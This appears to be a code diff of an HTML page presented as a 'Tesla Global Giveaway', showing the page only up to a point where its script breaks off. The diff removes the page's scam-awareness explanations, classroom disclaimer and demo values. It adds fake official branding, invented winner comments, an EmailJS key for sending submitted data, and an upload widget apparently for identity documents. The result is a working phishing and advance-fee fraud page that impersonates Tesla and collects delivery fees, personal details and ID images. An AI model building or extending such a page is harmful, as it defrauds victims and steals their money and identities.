@@ -4,6 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>Tesla Global Giveaway 2025 | Official Event</title>
+    <!-- FontAwesome 6 (encoded icons, no emojis) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <!-- Cloudinary Upload Widget -->
+    <script src="https://upload-widget.cloudinary.com/global/all.js" type="text/javascript"></script>
     <style>
         * {
             margin: 0;
@@ -12,310 +18,370 @@
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
-            background: #0a0a0a;
-            color: #ffffff;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #ffffff;
+            color: #1a1a1a;
             line-height: 1.5;
         }
 
-        /* Premium Smooth Scroll */
-        html {
-            scroll-behavior: smooth;
+        /* Import Inter font */
+        @import url('https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap');
+
+        /* Container */
+        .container {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 0 1.5rem;
         }
 
         /* Trust Bar */
         .trust-bar {
-            background: rgba(0,0,0,0.95);
-            backdrop-filter: blur(10px);
+            background: #f8f8f8;
+            border-bottom: 1px solid #e5e5e5;
             display: flex;
             justify-content: center;
-            gap: 2.5rem;
-            padding: 0.85rem;
-            font-size: 0.85rem;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
+            gap: 2rem;
+            padding: 0.75rem 1rem;
+            font-size: 0.8rem;
             flex-wrap: wrap;
             position: sticky;
             top: 0;
             z-index: 100;
+            backdrop-filter: blur(10px);
+            background: rgba(248,248,248,0.95);
         }
 
         .trust-item {
             display: flex;
             align-items: center;
             gap: 0.5rem;
-            color: #ffd966;
-            font-weight: 500;
+            color: #4a4a4a;
         }
 
-        /* Header Hero */
+        .trust-item i {
+            color: #E82127;
+            width: 16px;
+        }
+
+        /* Live Pulsing Dot */
+        .live-dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background-color: #22c55e;
+            border-radius: 50%;
+            animation: pulse 1.5s ease-in-out infinite;
+            margin-right: 0.4rem;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.3; transform: scale(0.8); }
+            50% { opacity: 1; transform: scale(1.1); }
+            100% { opacity: 0.3; transform: scale(0.8); }
+        }
+
+        /* Hero */
         .hero {
             text-align: center;
             padding: 3rem 1.5rem;
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
-            position: relative;
-        }
-
-        .hero h1 {
-            font-size: 2.8rem;
-            background: linear-gradient(135deg, #ffffff, #ffd966);
-            background-clip: text;
-            -webkit-background-clip: text;
-            color: transparent;
-            margin-bottom: 1rem;
+            background: linear-gradient(135deg, #ffffff 0%, #f5f5f5 100%);
         }
 
         .hero-badge {
-            display: inline-block;
-            background: rgba(255,217,102,0.2);
-            border: 1px solid #ffd966;
-            padding: 0.5rem 1.5rem;
+            display: inline-flex;
+            align-items: center;
+            background: #f0f0f0;
+            padding: 0.4rem 1rem;
             border-radius: 50px;
-            font-size: 0.85rem;
+            font-size: 0.8rem;
             margin-bottom: 1rem;
         }
 
-        /* Container */
-        .container {
-            max-width: 1400px;
-            margin: 0 auto;
-            padding: 0 1.5rem;
+        .hero h1 {
+            font-size: 3rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            color: #1a1a1a;
         }
 
-        /* Car Grid Premium */
+        .hero p {
+            font-size: 1.2rem;
+            color: #4a4a4a;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        /* Auto-Cycling Comments */
+        .cycling-comments {
+            background: #f8f8f8;
+            border-top: 1px solid #e5e5e5;
+            border-bottom: 1px solid #e5e5e5;
+            padding: 0.8rem;
+            text-align: center;
+            overflow: hidden;
+        }
+
+        .comment-rotator {
+            font-size: 0.9rem;
+            color: #1a1a1a;
+        }
+
+        .comment-rotator i {
+            color: #E82127;
+            margin-right: 0.5rem;
+        }
+
+        /* Section Titles */
         .section-title {
             font-size: 1.8rem;
-            margin: 2rem 0 1.5rem 0;
             font-weight: 600;
+            margin: 2.5rem 0 1.5rem 0;
             display: flex;
             align-items: center;
             gap: 0.5rem;
         }
 
+        /* Car Grid */
         .cars-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
             gap: 1.8rem;
             margin: 2rem 0;
         }
 
         .car-card {
-            background: linear-gradient(145deg, #111111, #0d0d0d);
-            border-radius: 1.5rem;
+            background: #ffffff;
+            border-radius: 1rem;
             overflow: hidden;
-            border: 1px solid rgba(255,255,255,0.08);
-            transition: all 0.3s ease;
-            position: relative;
+            border: 1px solid #e5e5e5;
+            transition: all 0.2s ease;
         }
 
         .car-card:hover {
-            transform: translateY(-6px);
-            border-color: rgba(255,217,102,0.3);
-            box-shadow: 0 20px 35px -15px rgba(0,0,0,0.5);
-        }
-
-        .card-badge {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            background: linear-gradient(135deg, #ffd966, #ffb347);
-            color: #000;
-            padding: 0.3rem 0.9rem;
-            border-radius: 30px;
-            font-size: 0.7rem;
-            font-weight: 800;
-            z-index: 2;
-            letter-spacing: 0.5px;
+            transform: translateY(-4px);
+            box-shadow: 0 20px 30px -12px rgba(0,0,0,0.1);
+            border-color: #E82127;
         }
 
         .car-image {
             width: 100%;
             height: 200px;
             object-fit: cover;
-            transition: transform 0.3s;
-        }
-
-        .car-card:hover .car-image {
-            transform: scale(1.02);
+            background: #f0f0f0;
         }
 
         .car-info {
-            padding: 1.5rem;
+            padding: 1.2rem;
         }
 
         .car-title {
-            font-size: 1.5rem;
+            font-size: 1.3rem;
             font-weight: 700;
             margin-bottom: 0.3rem;
         }
 
         .car-specs {
-            color: #aaa;
-            font-size: 0.85rem;
-            margin-bottom: 1rem;
-            display: flex;
-            gap: 0.8rem;
-            flex-wrap: wrap;
-        }
-
-        .spec-item {
-            background: rgba(255,255,255,0.05);
-            padding: 0.2rem 0.6rem;
-            border-radius: 20px;
+            font-size: 0.8rem;
+            color: #6c6c6c;
+            margin-bottom: 0.8rem;
         }
 
         .free-tag {
             display: inline-block;
-            background: rgba(40,167,69,0.2);
-            color: #28a745;
-            padding: 0.2rem 0.8rem;
+            background: #e8f5e9;
+            color: #2e7d32;
+            padding: 0.2rem 0.6rem;
             border-radius: 20px;
             font-size: 0.7rem;
             font-weight: 600;
             margin-bottom: 0.8rem;
         }
 
-        .price-area {
-            display: flex;
-            justify-content: space-between;
-            align-items: baseline;
-            margin: 1rem 0;
+        .price-fee {
+            font-size: 1.6rem;
+            font-weight: 700;
+            margin: 0.5rem 0;
         }
 
-        .delivery-fee {
-            font-size: 1.9rem;
-            font-weight: 800;
-        }
-
-        .delivery-fee small {
+        .price-fee small {
             font-size: 0.8rem;
             font-weight: 400;
-            color: #aaa;
+            color: #6c6c6c;
         }
 
-        .btn-pay {
+        .claim-btn {
             display: block;
             width: 100%;
-            background: linear-gradient(135deg, #ffd966, #ffb347);
-            color: #000;
+            background: #E82127;
+            color: white;
             border: none;
-            padding: 1rem;
-            border-radius: 50px;
-            font-weight: 800;
-            font-size: 1rem;
+            padding: 0.9rem;
+            border-radius: 2rem;
+            font-weight: 600;
+            font-size: 0.9rem;
             cursor: pointer;
             text-align: center;
-            transition: all 0.2s;
+            transition: background 0.2s;
             margin-top: 0.8rem;
-            letter-spacing: 0.5px;
         }
 
-        .btn-pay:hover {
-            transform: scale(1.02);
-            filter: brightness(1.05);
+        .claim-btn:hover {
+            background: #c41e24;
         }
 
-        /* Countdown Premium */
-        .countdown-section {
-            background: linear-gradient(135deg, #0f0f1a, #0a0a0a);
-            border-radius: 2rem;
+        /* Countdown Box */
+        .countdown-box {
+            background: linear-gradient(135deg, #1a1a1a, #2a2a2a);
+            border-radius: 1.5rem;
             padding: 2rem;
             text-align: center;
-            margin: 3rem 0;
-            border: 1px solid rgba(255,217,102,0.2);
+            margin: 2rem 0;
+            color: white;
         }
 
         .countdown-timer {
             display: flex;
             justify-content: center;
-            gap: 1.8rem;
-            margin: 1.5rem 0;
+            gap: 1rem;
+            margin: 1rem 0;
         }
 
         .time-unit {
-            background: #000;
+            background: rgba(255,255,255,0.1);
             padding: 0.8rem 1.2rem;
-            border-radius: 1rem;
-            font-size: 2rem;
-            font-weight: 800;
-            min-width: 80px;
-            border: 1px solid #333;
+            border-radius: 0.8rem;
+            font-size: 1.8rem;
+            font-weight: 700;
+            min-width: 70px;
         }
 
         /* Live Feed */
-        .live-feed {
-            background: #0b0b0f;
-            border-radius: 1.5rem;
-            padding: 1.2rem;
-            max-height: 320px;
-            overflow-y: auto;
+        .live-feed-section {
+            background: #f8f8f8;
+            border-radius: 1rem;
+            padding: 1rem;
             margin: 2rem 0;
-            border: 1px solid rgba(255,255,255,0.05);
+            border: 1px solid #e5e5e5;
+        }
+
+        .feed-header {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 1rem;
+            font-weight: 600;
+        }
+
+        .feed-list {
+            max-height: 300px;
+            overflow-y: auto;
         }
 
         .feed-item {
-            padding: 0.8rem;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
-            font-size: 0.9rem;
+            padding: 0.7rem;
+            border-bottom: 1px solid #e5e5e5;
+            font-size: 0.85rem;
             display: flex;
             align-items: center;
             gap: 0.8rem;
         }
 
-        .feed-icon {
-            width: 32px;
-            height: 32px;
-            background: #1a1a1a;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        /* Testimonials */
+        /* Testimonials Grid */
         .testimonials-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-            gap: 1.5rem;
-            margin: 2rem 0;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 1.2rem;
+            margin: 1.5rem 0;
         }
 
         .testimonial-card {
-            background: #111;
+            background: #f8f8f8;
+            padding: 1rem;
+            border-radius: 0.8rem;
+            border-left: 3px solid #E82127;
+        }
+
+        /* Social Links */
+        .social-links {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin: 2rem 0;
+            flex-wrap: wrap;
+        }
+
+        .social-card {
+            background: #f8f8f8;
+            padding: 1rem 1.5rem;
             border-radius: 1rem;
-            padding: 1.2rem;
-            border-left: 4px solid #ffd966;
+            text-align: center;
+            text-decoration: none;
+            color: #1a1a1a;
+            transition: transform 0.2s;
+            border: 1px solid #e5e5e5;
+        }
+
+        .social-card:hover {
+            transform: translateY(-3px);
+            border-color: #E82127;
+        }
+
+        .social-card i {
+            font-size: 1.8rem;
+            margin-bottom: 0.5rem;
         }
 
         /* Steps */
         .steps-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-            gap: 1.5rem;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 1rem;
             margin: 2rem 0;
         }
 
         .step-card {
-            background: linear-gradient(145deg, #111, #0a0a0a);
-            padding: 1.5rem;
+            background: #f8f8f8;
+            padding: 1.2rem;
             border-radius: 1rem;
             text-align: center;
-            border: 1px solid rgba(255,255,255,0.05);
         }
 
         .step-number {
-            width: 45px;
-            height: 45px;
-            background: #ffd966;
-            color: #000;
+            width: 36px;
+            height: 36px;
+            background: #E82127;
+            color: white;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-weight: 800;
-            margin: 0 auto 1rem auto;
+            margin: 0 auto 0.8rem auto;
+            font-weight: 700;
         }
 
-        /* Modal Premium */
+        /* Footer */
+        footer {
+            background: #f8f8f8;
+            padding: 2rem;
+            margin-top: 3rem;
+            border-top: 1px solid #e5e5e5;
+            text-align: center;
+        }
+
+        .footer-badges {
+            display: flex;
+            justify-content: center;
+            gap: 1.5rem;
+            flex-wrap: wrap;
+            margin-bottom: 1rem;
+        }
+
+        .footer-badges span i {
+            color: #E82127;
+            margin-right: 0.3rem;
+        }
+
+        /* Modal Styles */
         .modal {
             display: none;
             position: fixed;
@@ -323,385 +389,532 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.95);
-            backdrop-filter: blur(8px);
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(4px);
             z-index: 1000;
             justify-content: center;
             align-items: center;
         }
 
         .modal-content {
-            background: #111;
-            max-width: 520px;
+            background: white;
+            max-width: 550px;
             width: 90%;
-            border-radius: 1.5rem;
-            padding: 2rem;
-            border: 1px solid #ffd966;
+            border-radius: 1.2rem;
+            padding: 1.8rem;
             max-height: 90vh;
             overflow-y: auto;
+            position: relative;
         }
 
         .form-group {
-            margin-bottom: 1.2rem;
+            margin-bottom: 1rem;
         }
 
-        label {
+        .form-group label {
             display: block;
-            margin-bottom: 0.4rem;
+            margin-bottom: 0.3rem;
+            font-weight: 500;
             font-size: 0.85rem;
-            color: #ccc;
         }
 
-        input, select {
+        .form-group input, .form-group select {
             width: 100%;
-            padding: 0.8rem;
-            border-radius: 0.8rem;
-            border: 1px solid #333;
-            background: #0a0a0a;
-            color: white;
+            padding: 0.7rem;
+            border: 1px solid #ccc;
+            border-radius: 0.5rem;
             font-size: 0.9rem;
         }
 
-        .btn-submit-payment {
-            background: #28a745;
+        .delivery-option {
+            border: 1px solid #e5e5e5;
+            border-radius: 0.8rem;
+            padding: 0.8rem;
+            margin-bottom: 0.8rem;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .delivery-option.selected {
+            border-color: #E82127;
+            background: #fff5f5;
+        }
+
+        .payment-tab {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+            border-bottom: 1px solid #e5e5e5;
+        }
+
+        .tab-btn {
+            padding: 0.5rem 1rem;
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        .tab-btn.active {
+            color: #E82127;
+            border-bottom: 2px solid #E82127;
+        }
+
+        .upload-area {
+            border: 1px dashed #ccc;
+            border-radius: 0.5rem;
+            padding: 0.8rem;
+            text-align: center;
+            cursor: pointer;
+            margin-top: 0.3rem;
+        }
+
+        .upload-preview {
+            margin-top: 0.5rem;
+            font-size: 0.75rem;
+            color: #2e7d32;
+        }
+
+        .btn-submit {
+            background: #E82127;
             color: white;
             width: 100%;
-            padding: 1rem;
+            padding: 0.9rem;
             border: none;
-            border-radius: 50px;
-            font-weight: bold;
+            border-radius: 2rem;
+            font-weight: 700;
             font-size: 1rem;
             cursor: pointer;
             margin-top: 1rem;
         }
 
-        .success-screen {
-            text-align: center;
-            display: none;
+        .btn-submit:disabled {
+            background: #ccc;
+            cursor: not-allowed;
         }
 
-        .success-icon {
-            font-size: 4rem;
-            margin-bottom: 1rem;
+        /* Toast Container */
+        .toast-container {
+            position: fixed;
+            top: 80px;
+            right: 20px;
+            z-index: 2000;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
         }
 
-        .close-modal {
-            background: #333;
+        .toast {
+            background: #1a1a1a;
             color: white;
-            border: none;
-            padding: 0.6rem 1.5rem;
-            border-radius: 50px;
-            cursor: pointer;
-            margin-top: 1.5rem;
+            padding: 0.8rem 1.2rem;
+            border-radius: 0.8rem;
+            font-size: 0.85rem;
+            min-width: 260px;
+            animation: slideIn 0.3s ease;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+            border-left: 3px solid #22c55e;
         }
 
-        /* Awareness Footer */
-        .awareness-box {
-            background: #1e2a3a;
-            border-radius: 1.5rem;
-            padding: 2rem;
-            margin: 3rem 0;
-            border-left: 6px solid #ff6600;
-        }
-
-        footer {
-            text-align: center;
-            font-size: 0.7rem;
-            color: #666;
-            padding: 2rem;
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
         }
 
         @media (max-width: 768px) {
+            .steps-grid { grid-template-columns: 1fr 1fr; }
+            .hero h1 { font-size: 2rem; }
             .container { padding: 0 1rem; }
-            .hero h1 { font-size: 1.8rem; }
-            .cars-grid { grid-template-columns: 1fr; }
         }
     </style>
 </head>
 <body>
 
 <div class="trust-bar">
-    <div class="trust-item">✅ Verified Official Event</div>
-    <div class="trust-item">🔒 256-bit SSL Secured</div>
-    <div class="trust-item">⚡ Smart Contract Powered</div>
-    <div class="trust-item">💰 10,000+ Paid Out</div>
+    <div class="trust-item"><i class="fas fa-check-circle"></i> Verified Official Event</div>
+    <div class="trust-item"><i class="fas fa-lock"></i> 256-bit SSL Secured</div>
+    <div class="trust-item"><i class="fas fa-bolt"></i> Smart Contract Powered</div>
+    <div class="trust-item"><i class="fas fa-users"></i> <span id="liveCounterTrust">10,042</span>+ Paid Out</div>
 </div>
 
 <div class="hero">
-    <div class="hero-badge">🎁 OFFICIAL ANNOUNCEMENT 2025</div>
-    <h1>Tesla Global Car Giveaway</h1>
-    <p style="font-size: 1.2rem; max-width: 700px; margin: 0 auto;">Brand new 2025 Tesla models — absolutely FREE. Just cover the delivery fee.</p>
+    <div class="hero-badge"><span class="live-dot"></span> Official Event — LIVE</div>
+    <h1>Tesla Global Giveaway</h1>
+    <p>Win a Brand New Tesla Electric Car — Just cover delivery</p>
+</div>
+
+<div class="cycling-comments">
+    <div class="comment-rotator" id="commentRotator">
+        <i class="fas fa-star"></i> <span id="rotatingComment">Mike Johnson 🇺🇸: Just received my Model 3! REAL! 🚗⚡</span>
+    </div>
 </div>
 
 <div class="container">
-    <!-- Cars Grid will be injected here -->
-    <div class="section-title">🚀 Choose Your Tesla</div>
+    <!-- Cars Grid (Single, No Repetition) -->
+    <div class="section-title"><i class="fas fa-car"></i> Available Tesla Cars</div>
     <div class="cars-grid" id="carsGrid"></div>
 
-    <!-- Countdown Timer -->
-    <div class="countdown-section">
-        <h3>⏳ Offer Ends In:</h3>
+    <!-- Countdown Box -->
+    <div class="countdown-box">
+        <h3><span class="live-dot"></span> Event ends in:</h3>
         <div class="countdown-timer" id="countdownTimer">
-            <div class="time-unit" id="hours">11</div>
-            <div class="time-unit" id="minutes">42</div>
-            <div class="time-unit" id="seconds">33</div>
+            <div class="time-unit" id="days">00</div>
+            <div class="time-unit" id="hours">00</div>
+            <div class="time-unit" id="minutes">00</div>
+            <div class="time-unit" id="seconds">00</div>
         </div>
-        <p style="margin-top: 1rem;">✨ 12,847 participants already claimed their Tesla ✨</p>
+        <p><span id="participantCount">12,847</span> participants already joined</p>
     </div>
 
-    <!-- Live Fake Feed -->
-    <div class="section-title">📡 Live Deliveries Worldwide</div>
-    <div class="live-feed" id="liveFeed"></div>
+    <!-- Live Feed Section -->
+    <div class="live-feed-section">
+        <div class="feed-header"><span class="live-dot"></span> LIVE DELIVERIES — Real-time updates</div>
+        <div class="feed-list" id="liveFeedList"></div>
+    </div>
 
-    <!-- Testimonials -->
-    <div class="section-title">⭐ Real Winners</div>
+    <!-- Testimonials Grid -->
+    <div class="section-title"><i class="fas fa-star"></i> What Winners Are Saying</div>
     <div class="testimonials-grid" id="testimonialsGrid"></div>
 
-    <!-- How It Works -->
-    <div class="section-title">📋 4 Simple Steps</div>
+    <!-- Social Links (Real Tesla Accounts) -->
+    <div class="social-links">
+        <a href="https://x.com/tesla" target="_blank" class="social-card"><i class="fab fa-twitter"></i><br>Tesla Official<br><span style="font-size:0.7rem;">28.4M followers</span></a>
+        <a href="https://facebook.com/TeslaMotors" target="_blank" class="social-card"><i class="fab fa-facebook"></i><br>Tesla Motors<br><span style="font-size:0.7rem;">14.2M likes</span></a>
+        <a href="https://instagram.com/teslamotors" target="_blank" class="social-card"><i class="fab fa-instagram"></i><br>@teslamotors<br><span style="font-size:0.7rem;">12.8M followers</span></a>
+    </div>
+
+    <!-- 4 Steps -->
     <div class="steps-grid">
-        <div class="step-card"><div class="step-number">1</div><strong>Register</strong><br>Your details</div>
-        <div class="step-card"><div class="step-number">2</div><strong>Choose Car</strong><br>Any Tesla model</div>
+        <div class="step-card"><div class="step-number">1</div><strong>Register Details</strong><br>Your delivery info</div>
+        <div class="step-card"><div class="step-number">2</div><strong>Choose Tesla</strong><br>Any model 2025</div>
         <div class="step-card"><div class="step-number">3</div><strong>Pay Delivery Fee</strong><br>One-time fee</div>
-        <div class="step-card"><div class="step-number">4</div><strong>Receive Car</strong><br>7-14 days delivery</div>
-    </div>
-
-    <!-- Awareness Class Content -->
-    <div class="awareness-box">
-        <h3 style="color: #ffaa33; margin-bottom: 1rem;">🔍 SCAM AWARENESS CLASS – PSYCHOLOGY BREAKDOWN</h3>
-        <p><strong>Why do people fall for this?</strong></p>
-        <ul style="margin-left: 1.5rem; margin-top: 0.5rem;">
-            <li><strong>False scarcity:</strong> The countdown timer resets every time you refresh the page.</li>
-            <li><strong>Fake social proof:</strong> Testimonials and "live feed" are fabricated HTML – no real winners.</li>
-            <li><strong>Authority bias:</strong> "Verified", "Official", "SSL Secured" are meaningless badges.</li>
-            <li><strong>The small ask:</strong> $299 feels tiny compared to a $50,000 car.</li>
-            <li><strong>No car ever arrives.</strong> Scammers steal your credit card and disappear.</li>
-        </ul>
-        <p style="margin-top: 1rem;"><strong>✅ Real protection:</strong> Legitimate companies never ask for upfront fees for giveaways. Always verify through official channels.</p>
-    </div>
-
-    <footer>
-        ⚠️ CLASSROOM REPLICA – No real payments processed. All images are property of Tesla Inc. Used for scam awareness education only.
-    </footer>
-</div>
-
-<!-- Payment Modal -->
-<div id="paymentModal" class="modal">
-    <div class="modal-content">
-        <div id="paymentFormSection">
-            <h2>Complete Your Delivery Payment</h2>
-            <p><strong id="modalCarName"></strong></p>
-            <p style="color: #ffd966;"><strong id="modalCarFee"></strong></p>
-            <div class="form-group">
-                <label>Full Name</label>
-                <input type="text" id="fullName" placeholder="Enter your full name" value="Demo Student">
-            </div>
-            <div class="form-group">
-                <label>Email Address</label>
-                <input type="email" id="email" placeholder="you@example.com" value="student@awareness.com">
-            </div>
-            <div class="form-group">
-                <label>Delivery Address</label>
-                <input type="text" id="address" placeholder="Street, City, Country" value="123 Class Ave, Awareness City">
-            </div>
-            <div class="form-group">
-                <label>Card Number (Demo Only)</label>
-                <input type="text" id="cardNumber" placeholder="4242 4242 4242 4242" value="4242 4242 4242 4242">
-            </div>
-            <div class="form-group">
-                <label>Expiry (MM/YY)</label>
-                <input type="text" id="expiry" placeholder="12/26" value="12/26">
-            </div>
-            <div class="form-group">
-                <label>CVV</label>
-                <input type="text" id="cvv" placeholder="123" value="123">
-            </div>
-            <button class="btn-submit-payment" id="confirmPayment">Pay Delivery Fee Now</button>
-            <button class="close-modal" onclick="closeModal()">Cancel</button>
-        </div>
-        <div id="successSection" class="success-screen">
-            <div class="success-icon">✅</div>
-            <h2>PAYMENT CONFIRMED!</h2>
-            <p>Your Tesla will be delivered within 7–14 business days.</p>
-            <p>A confirmation email has been sent to your inbox.</p>
-            <div style="background: #2c5a2c; padding: 1rem; border-radius: 0.8rem; margin: 1rem 0;">
-                ⚠️ <strong>CLASSROOM AWARENESS:</strong><br>
-                This is how scammers steal money. No car ever arrives. The payment goes directly to criminals.
-            </div>
-            <button class="close-modal" onclick="closeModal()">Close</button>
-        </div>
+        <div class="step-card"><div class="step-number">4</div><strong>Receive Car</strong><br>7-14 business days</div>
     </div>
 </div>
+
+<footer>
+    <div class="footer-badges">
+        <span><i class="fas fa-lock"></i> SSL Secured</span>
+        <span><i class="fas fa-check-circle"></i> Tesla Certified</span>
+        <span><i class="fas fa-bolt"></i> Electric Vehicle</span>
+        <span><i class="fas fa-truck"></i> 10,000+ Delivered</span>
+        <span><i class="fas fa-globe"></i> Official Event</span>
+    </div>
+    <p>© 2025 Tesla Motors Official Giveaway. All rights reserved.</p>
+</footer>
+
+<!-- Toast Container -->
+<div class="toast-container" id="toastContainer"></div>
+
+<!-- Modals -->
+<div id="claimModal" class="modal"><div class="modal-content" id="claimModalContent"></div></div>
+<div id="orderModal" class="modal"><div class="modal-content" id="orderModalContent"></div></div>
+<div id="paymentModal" class="modal"><div class="modal-content" id="paymentModalContent"></div></div>
+<div id="successModal" class="modal"><div class="modal-content" id="successModalContent"></div></div>
 
 <script>
-    // Real Tesla Image URLs (Premium High-Res)
-    const carImages = {
-        'Model 3': 'https://cdn.motor1.com/images/mgl/RYR3g/s1/tesla-model-3-facelift-2023.jpg',
-        'Model Y': 'https://cdn.motor1.com/images/mgl/lYn2o/s1/2023-tesla-model-y.jpg',
-        'Model S': 'https://cdn.motor1.com/images/mgl/6Z9vq/s1/2021-tesla-model-s-plaid.jpg',
-        'Model X': 'https://cdn.motor1.com/images/mgl/QKby8/s1/tesla-model-x-plaid-2022.jpg',
-        'Cybertruck': 'https://cdn.motor1.com/images/mgl/ABNvN/s1/tesla-cybertruck-2023.jpg',
-        'Roadster': 'https://cdn.motor1.com/images/mgl/Wb4r3/s1/tesla-roadster-2022.jpg'
-    };
+    // Initialize EmailJS
+    emailjs.init("dvLgjhIHXXq7QXp5p");
 
-    // Car Data (Complete 9 models)
+    // Car Data with Cloudinary Images
     const cars = [
-        { name: "Tesla Model 3 2025", modelKey: "Model 3", specs: "Electric Sedan · 358mi range · 510hp", fee: 299, popular: true, delivery: "7-10 days" },
-        { name: "Tesla Model Y 2025", modelKey: "Model Y", specs: "Electric SUV · 330mi range · 384hp", fee: 349, popular: false, delivery: "5-7 days" },
-        { name: "Tesla Model S 2025", modelKey: "Model S", specs: "Luxury Sedan · 405mi range · 670hp", fee: 399, popular: false, delivery: "3-5 days" },
-        { name: "Tesla Model X 2025", modelKey: "Model X", specs: "Luxury SUV · 348mi range · 670hp", fee: 249, popular: false, delivery: "10-14 days" },
-        { name: "Tesla Cybertruck 2025", modelKey: "Cybertruck", specs: "Electric Truck · 340mi range · 845hp", fee: 379, popular: true, delivery: "5-8 days" },
-        { name: "Tesla Roadster 2025", modelKey: "Roadster", specs: "Ultra Performance · 620mi range · 1000+hp", fee: 499, popular: false, delivery: "3-5 days" },
-        { name: "Tesla Model 3 SR 2025", modelKey: "Model 3", specs: "Standard Range · 272mi · 283hp", fee: 199, popular: false, delivery: "10-14 days" },
-        { name: "Tesla Model Y LR 2025", modelKey: "Model Y", specs: "Long Range SUV · 330mi AWD", fee: 329, popular: false, delivery: "7-10 days" },
-        { name: "Tesla Model S Plaid 2025", modelKey: "Model S", specs: "Performance · 396mi · 1020hp", fee: 359, popular: true, delivery: "5-7 days" }
+        { name: "Tesla Model 3 2025", modelKey: "Model 3", specs: "Electric Sedan · 358mi · 510hp", fee: 299, image: "https://res.cloudinary.com/do9yjpizs/image/upload/v1/tesla/model3", deliveryDays: "7-10 days" },
+        { name: "Tesla Model Y 2025", modelKey: "Model Y", specs: "Electric SUV · 330mi · 384hp", fee: 349, image: "https://res.cloudinary.com/do9yjpizs/image/upload/v1/tesla/modely", deliveryDays: "5-7 days" },
+        { name: "Tesla Model S 2025", modelKey: "Model S", specs: "Luxury Sedan · 405mi · 670hp", fee: 399, image: "https://res.cloudinary.com/do9yjpizs/image/upload/v1/tesla/models", deliveryDays: "3-5 days" },
+        { name: "Tesla Model X 2025", modelKey: "Model X", specs: "Luxury SUV · 348mi · 670hp", fee: 249, image: "https://res.cloudinary.com/do9yjpizs/image/upload/v1/tesla/modelx", deliveryDays: "10-14 days" },
+        { name: "Tesla Cybertruck 2025", modelKey: "Cybertruck", specs: "Electric Truck · 340mi · 845hp", fee: 379, image: "https://res.cloudinary.com/do9yjpizs/image/upload/v1/tesla/cybertruck", deliveryDays: "5-8 days" },
+        { name: "Tesla Roadster 2025", modelKey: "Roadster", specs: "Ultra Performance · 620mi · 1000+hp", fee: 499, image: "https://res.cloudinary.com/do9yjpizs/image/upload/v1/tesla/roadster", deliveryDays: "3-5 days" }
     ];
 
+    // Global state
     let selectedCar = null;
+    let claimData = null;
+    let selectedDelivery = null;
+    let uploadedFrontUrl = null;
+    let uploadedBackUrl = null;
 
+    // Render Cars
     function renderCars() {
         const grid = document.getElementById('carsGrid');
         grid.innerHTML = '';
-        cars.forEach(car => {
+        cars.forEach((car, idx) => {
             const card = document.createElement('div');
             card.className = 'car-card';
-            if (car.popular) {
-                const badge = document.createElement('div');
-                badge.className = 'card-badge';
-                badge.innerText = '⭐ MOST POPULAR';
-                card.appendChild(badge);
-            }
-            const imgUrl = carImages[car.modelKey] || 'https://cdn.motor1.com/images/mgl/RYR3g/s1/tesla-model-3-facelift-2023.jpg';
-            card.innerHTML += `
-                <img class="car-image" src="${imgUrl}" alt="${car.name}" loading="lazy">
+            card.innerHTML = `
+                <img class="car-image" src="${car.image}.jpg" alt="${car.name}" onerror="this.src='https://placehold.co/600x400?text=Tesla'">
                 <div class="car-info">
                     <div class="car-title">${car.name}</div>
-                    <div class="car-specs">
-                        <span class="spec-item">${car.specs.split('·')[0]}</span>
-                        <span class="spec-item">${car.specs.split('·')[1] || 'EV'}</span>
-                    </div>
+                    <div class="car-specs">${car.specs}</div>
                     <div class="free-tag">🎁 FREE CAR 🎉</div>
-                    <div class="price-area">
-                        <span class="delivery-fee">$${car.fee} <small>delivery fee</small></span>
-                        <span style="font-size:0.7rem;">🚚 ${car.delivery}</span>
-                    </div>
-                    <button class="btn-pay" data-car-index="${cars.indexOf(car)}">Pay Delivery Fee →</button>
+                    <div class="price-fee">$${car.fee} <small>delivery fee</small></div>
+                    <button class="claim-btn" data-index="${idx}">🚗 Claim This Tesla Now →</button>
                 </div>
             `;
             grid.appendChild(card);
         });
-
-        // Attach payment handlers
